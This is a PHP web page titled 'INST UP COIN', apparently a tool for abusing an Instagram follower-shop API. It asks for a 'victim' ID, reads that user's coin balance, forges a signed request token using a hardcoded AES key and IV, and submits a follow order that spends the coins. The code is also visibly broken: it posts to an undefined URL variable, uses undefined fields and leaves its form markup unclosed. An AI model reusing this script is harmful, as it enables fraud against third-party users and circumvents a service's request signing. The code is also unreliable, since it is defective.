<html>
   <head>
      <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
<style type="text/css">@import url('https://fonts.googleapis.com/css?family=Poppins');
/* BASIC */

:root { --main-color:#FF9B00; --shadow-color: rgba(200,200, 200, 9.4);}
body { width: 100%; height: 100vh; background-image: linear-gradient(45deg, var(--main-color) 45%, #ffffff 0%); background-repeat: no-repeat; }


img { width: 25%; margin: 20px auto 5px auto; padding-top: 30px; display: block;}



input[type=text],select { background-color: #f6f6f6; border: none; color: #0d0d0d; padding: 12px 32px; text-align: left; text-decoration: none; display: block; font-size: 14px; margin: 5px auto; width: 85%; border: 2px solid #f6f6f6; -webkit-transition: all 0.5s ease-in-out; -moz-transition: all 0.5s ease-in-out; -ms-transition: all 0.5s ease-in-out; -o-transition: all 0.5s ease-in-out;}

input[type=button], input[type=submit], input[type=reset] { background-color: var(--main-color); border: none; color: white; letter-spacing: 1px; padding: 12px 80px; text-align: center; text-decoration: none; display: block; text-transform: uppercase; font-size: 13px; -webkit-box-shadow: 0 10px 30px 0 var(--shadow-color); box-shadow: 0 10px 30px 0 var(--shadow-color); -webkit-border-radius: 5px 5px 5px 5px; border-radius: 5px 5px 5px 5px; margin: 5px auto 35px auto; -webkit-transition: all 0.3s ease-in-out; -moz-transition: all 0.3s ease-in-out; -ms-transition: all 0.3s ease-in-out; -o-transition: all 0.3s ease-in-out; transition: all 0.3s ease-in-out; cursor: pointer;}



</style>
     </head>
<body>

 <?php

echo "   
<br>
<br>     
<br>
<br>       
<br>
<br>
<center><h1>INST UP COIN <span></span></h1></center>
<br>
<br>
<br>     
<br>
<br>     
<br>
<br> 
";

if(isset($_GET['submit'])){
	$uidx=$_GET['userid'];
    $uid=$_GET['target'];
 
    
  $url1 = json_decode(file_get_contents("http://instaup.marsapi.com/get_likes/shop/daily_coins?user_id=$uid"));



	$ch = curl_init();

	$output1= $url1->return->coins;
  
	$ch =$output1;


    $json1=json_decode($output1,true);
  $c1=$json1['coins'];
  $d1 = $c1 / 4;
  $d2 = explode(".",$d1)['0'];
      $url88="https://instaup.marsapi.com/get_likes/order/follow";




$idx=$uid+3423;

$d=$idx.'ig';

$i='3rFz>|)VHl-w+5I0';

if($d2 > 1000){
$d2 = '1000';
} else {
$d2 = $d2;
}


$k='#p0yJmVK/@($nX?#';
$enc_data = base64_encode(openssl_encrypt($d,"AES-128-CBC",$k,OPENSSL_RAW_DATA,$i));
$tkv=md5($enc_data.':M3JGej58KVZIbC13KzVJMA==');





$dx=urlencode($dx);


$ll='https%3A%5C%2F%5C%2Finstagram.fccu3-1.fna.fbcdn.net%5C%2Fv%5C%2Ft51.2885-15%5C%2Fe35%5C%2Fs150x150%5C%2F264420143_435496831548995_8076441957316773167_n.jpg%3F_nc_ht%3Dinstagram.fccu3-1.fna.fbcdn.net%26_nc_cat%3D111%26_nc_ohc%3DvWrY6qsKOOAAX9ZgJLH%26edm%3DAPU89FABAAAA%26ccb%3D7-4%26oh%3D00_AT_GHVnpr10j1bCs8Dx5unohvTyp_1DgOtu8It7P_Nmpfw%26oe%3D61B616B1%26_nc_sid%3D86f79a';

 $data0='gift=0&order_count='.$d2.'&user_id='.$uid.'&tokenV2='.$tkv.'&start_value=1700&media_url=%7B%22media_url%22%3A%22'.$ll.'%22%2C%22user_name%22%3A%22'.$fname.'%22%7D&order_id='.$uidx;

 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL,$url0);
 curl_setopt($ch, CURLOPT_POST, 1);
 curl_setopt($ch, CURLOPT_POSTFIELDS,$data0);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
  $cc= curl_exec ($ch);
 curl_close ($ch);
    $jsonn=json_decode($cc,true);
    $c=$jsonn['status'];
    if($c == 'Successful'){
echo "<div class='success'><center>
<font color='green'><hr>$output1: COIN 
</font></center></div>";
} else {

echo "<div class='success'><center>
<font color='green'><hr><h2>$output1: COIN </h2>
<hr></font></center></div>";
}


	    }
	
		
if(!isset($_GET['submit']))
	{
	?>
<form action='' method='get'>
		
					<input type='text' name='target' placeholder='ادخل ايدي الضحيه'  required>	
      <input type="submit" name='submit' value='submit'
	<?php
	}
?>

</center>

 
 </html>

